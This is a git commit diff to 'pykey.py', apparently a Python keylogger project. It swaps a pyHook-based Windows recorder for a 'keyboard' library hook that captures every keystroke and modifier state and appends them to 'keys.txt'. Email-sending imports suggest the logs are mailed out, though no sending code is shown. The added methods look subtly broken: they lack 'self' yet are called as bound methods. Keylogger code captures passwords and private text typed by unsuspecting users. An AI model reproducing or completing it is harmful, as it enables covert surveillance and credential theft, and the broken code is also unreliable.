543acdf4d0245ab8b5bb78ec9eb47970eaedf6cf
Gorka <gorka1802@gmail.com>
2019-01-15 20:11:43 +0100

    Updated

--- pykey.py
+++ pykey.py
@@ -11,6 +11,15 @@ from email.mime.text import MIMEText
 from email.utils import COMMASPACE, formatdate
 
 
+FILE_NAME = "keys.txt"
+CLEAR_ON_STARTUP = False
+TERMINATE_KEY = "esc"
+MAP = {
+    "space": " ",
+    "\r": "\n"
+}
+
+
 class PyKey:
     def __init__(self):
         """ Initialization method
@@ -141,17 +150,66 @@ class PyKey:
             on_release = self.onRelease) as listener:
             listener.join()
 
-    def recordWindows(self):
-        """ Record strategy for Windows
-            Arguments:
-                self (PyKey): self instance
-        """
-        import pyHook, pythoncom, sys
-        import time, datetime
 
-        hooks_manager = pyHook.HookManager()
-        hooks_manager.KeyDown = self.onKeyboardWinEvent
-        hooks_manager.HookKeyboard()
+    def onexit(output):
+        output.close()
+
+    def callback(output, is_down, event):
+        if event.event_type in ("up", "down"):
+            key = MAP.get(event.name, event.name)
+            modifier = len(key) > 1
+            # Capturar únicamente los modificadores cuando están siendo
+            # presionados.
+            if not modifier and event.event_type == "down":
+                return
+            # Evitar escribir múltiples veces la misma tecla si está
+            # siendo presionada.
+            if modifier:
+                if event.event_type == "down":
+                    if is_down.get(key, False):
+                        return
+                    else:
+                        is_down[key] = True
+                elif event.event_type == "up":
+                    is_down[key] = False
+                # Indicar si está siendo presionado.
+                key = " [{} ({})] ".format(key, event.event_type)
+            elif key == "\r":
+                # Salto de línea.
+                key = "\n"
+            # Escribir la tecla al archivo de salida.
+            output.write(key)
+            # Forzar escritura.
+            output.flush()
+
+    def recordWindows(self):
+        from functools import partial
+        import atexit
+        import os
+
+        import keyboard
+
+        # Borrar el archivo previo.
+        if CLEAR_ON_STARTUP:
+            os.remove(FILE_NAME)
+
+        # Indica si una tecla está siendo presionada.
+        is_down = {}
+
+        # Archivo de salida.
+        output = open(FILE_NAME, "a")
+
+        # Cerrar el archivo al terminar el programa.
+        atexit.register(self.onexit, output)
+
+        # Instalar el registrador de teclas.
+        keyboard.hook(partial(self.callback, output, is_down))
+        keyboard.wait(TERMINATE_KEY)
+
+
+
+
+
 
     def onKeyboardWinEvent(self, event):
         logging.basicConfig(
